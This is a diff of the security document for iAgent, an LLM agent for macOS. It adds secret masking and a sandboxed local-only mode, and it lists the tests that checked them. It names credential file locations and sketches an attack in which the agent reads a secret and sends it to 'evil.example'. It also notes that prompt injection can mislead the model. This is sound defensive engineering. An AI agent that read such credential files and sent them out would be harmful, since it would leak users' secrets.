@@ -6,7 +6,7 @@ iAgent runs an LLM that can read files, run commands and act on your Apple devic
 - the controls that do it, mapped to the standards they come from,
 - the risks that remain.
 
-The last review was on 2026-10-07 against v0.2.0. Every control below has a regression test that tries to break it, listed under "How it was verified".
+The last review was on 2026-10-09 against v0.2.0 plus secret masking and local-only mode. Every control below has a regression test that tries to break it, listed under "How it was verified".
 
 ## Threat model
 
@@ -36,13 +36,23 @@ The last review was on 2026-10-07 against v0.2.0. Every control below has a regr
 
 ### Data exfiltration and secrets (OWASP LLM02, CWE-200/312/522/732)
 
-- **Secret files need confirmation every time.** This covers `.env*`, `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, Keychains, `*.pem/*.key/*.p12`, `.netrc`, `.git-credentials`, `~/.iagent`, and similar.
+- **Secret files are never sent to a cloud model.** Reads of `.env*`, `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, Keychains, `*.pem/*.key/*.p12`, `.netrc`, `.git-credentials`, `~/.iagent`, and similar are blocked outright (approval level `blocked`, which neither the user nor `--yolo` can override). In local-only mode they can be read after confirming each time. Writing them always needs confirmation.
+- **Secrets are masked before anything reaches the model** (`Redact`). This covers the user's messages, every tool result and error, and the project instruction files in the system prompt. Masked items: well-known token formats (Anthropic, OpenAI, GitHub, GitLab, Slack, AWS, Google, Stripe, npm, Hugging Face, JWT), private key blocks, URL passwords, `Bearer`/`Basic` tokens, `password=`/`token:`-style values containing letters and digits, the resolved API key, and the value of every environment variable whose name contains KEY, TOKEN, SECRET, PASSWORD, CREDENTIAL or AUTH. The user sees a "masked N secrets" notice each time.
 - **Symlinks are resolved first.** So `innocent.txt -> ~/.ssh/id_rsa` is caught.
 - **`grep` never opens secret files.** It tells the model how many it skipped.
 - **`web_fetch` asks per host.** This closes the "read a secret, then fetch `evil.example/?k=<secret>`" path.
 - **API keys are removed from child processes.** `bash`, `osascript` and every helper run without `*_API_KEY` in their environment, including any custom `apiKeyEnv`.
 - **Keys can live in the macOS Keychain** (`apiKeyKeychain`). A config file containing `apiKey` that other users can read triggers a startup warning.
 - **Nothing is written to disk.** No transcript, cookie or cache is stored (sessions are ephemeral). Temporary files are deleted immediately.
+
+### Local-only mode (`--local`, `localOnly`, `IAGENT_LOCAL_ONLY`)
+
+In this mode, no data leaves the machine:
+
+- **Model server on loopback only.** `localhost`, `127.0.0.0/8` and `::1` are allowed. Cloud APIs and LAN addresses are refused, and the provider is never autodetected from a cloud API key.
+- **Egress tools removed.** `web_fetch`, `messages`, `airdrop`, `shortcuts`, `applescript`, `ios_device` and `apple_devices` (Bonjour/Bluetooth scanning) are not offered to the model, and a call to one is refused.
+- **Egress actions blocked.** These sync through iCloud or reach other devices: reminder/calendar/note changes, `mac open` (URLs), `mac clipboard_set` (Universal Clipboard), and `simulator openurl`/`raw`.
+- **`bash` runs under a Seatbelt sandbox** (`sandbox-exec`, `LocalOnly.sandboxProfile`), inherited by every child process. It denies outbound IP except to localhost, the DNS resolver services, LaunchServices opens (`open URL`/apps) and Apple Events (which could make another app send the data).
 
 ### Transport (CWE-319, OWASP ASVS V12)
 
@@ -89,10 +99,11 @@ The last review was on 2026-10-07 against v0.2.0. Every control below has a regr
 
 1. **Approved `bash` commands can do anything your user account can.** Read every command before approving. With `--yolo`, all non-sensitive tools run without asking, so use it only in throwaway environments.
 2. **Prompt injection can't be fully prevented.** The model can still be misled into *proposing* harmful actions. The approval prompt is the safety boundary.
-3. **The model provider sees everything the model reads.** Use a local model (Ollama, LM Studio) for confidential work.
+3. **The model provider sees everything the model reads, apart from masked secrets.** Masking is pattern-based (a deny-list). A password with no digits, or a secret in an unusual format, can get through. Use `--local` for confidential work.
 4. **macOS grants privacy permissions to your terminal app** when it launches iAgent. Other tools run from that terminal share those grants.
 5. **No App Sandbox.** It's incompatible with a developer agent that must run arbitrary tools.
 6. **The secret-file list is a deny-list.** Unusual secret locations aren't recognized. The approval prompt for reading outside the project still applies to them.
+7. **Local-only mode protects against data leaving the machine, but it can't stop everything.** An approved `bash` command can still change local files, and XPC services that the sandbox doesn't name could in principle make network requests on its behalf. `sandbox-exec` is deprecated by Apple, though still shipped and enforced. Ordinary tool calls in local mode (reading reminders, contacts or notes) keep their data on the Mac, because the model is local too.
 
 ## Reporting a vulnerability
 
@@ -112,6 +123,8 @@ Each control was tested with harmless payloads on macOS 26.7. These probes are a
   - The bundle id `--erase` was rejected.
 - **Transport:** plain HTTP to a remote host was refused. A 307 redirect on the API was refused, and the redirect target never received the `Authorization` header. A cross-host `web_fetch` redirect wasn't followed.
 - **API keys:** `$OPENAI_API_KEY` was empty inside `bash`.
+- **Secret masking:** API keys of each known format, private key blocks, URL passwords, `.env`-style values and registered env values were masked in tool results. Ordinary code such as `apiKey = config.apiKey` was left alone, and a full scan of this repository masked only the test fixture. A `read_file` of `.env` was blocked even with `--yolo`.
+- **Local-only mode:** Anthropic and LAN model servers were refused. `web_fetch` was not offered and `mac open` was blocked. Inside sandboxed `bash`, `curl https://…`, raw sockets, DNS lookups, `open URL` and Apple Events to Finder and Mail all failed (compared against an unsandboxed run where the network worked), while git, swift and python ran normally.
 - **Resource limits:** 30 MB of output was capped at 10 MB.
 - **Messages:** refused non-interactively even with `--yolo`.
 - **Signed build:** passes `codesign --verify --strict` with the `runtime` flag.
